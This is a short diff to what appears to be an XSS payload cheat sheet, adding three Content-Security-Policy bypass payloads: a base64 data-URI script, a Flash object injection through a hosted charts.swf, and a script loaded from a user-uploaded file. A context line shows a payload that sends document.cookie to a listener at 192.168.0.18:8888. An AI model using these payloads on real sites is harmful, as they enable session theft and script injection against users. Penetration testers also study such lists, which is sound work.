@@ -27,11 +27,16 @@ i.src="http://192.168.0.18:8888/?"+document.cookie;
 ==============================================================================
 [+] Bypass Content-security-policy header XSS
 ==============================================================================
-
+# https://medium.com/@bhavesh_thakur/content-security-policy-csp-bypass-techniques-e3fa475bfe5d
+# 1. 
 <script src="data:;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKQ=="></script>
 
+# 2.
 <object type="application/x-shockwave-flash" data='https: //ajax.googleapis.com/ajax/libs/yui/2.8.0 r4/build/charts/assets/charts.swf?allowedDomain=\"})))}catch(e) {alert(1337)}//'>
 <param name="AllowScriptAccess" value="always"></object>
+
+# 3.
+<script src="/user_upload/mypic.png.js"></script>
 
 
 
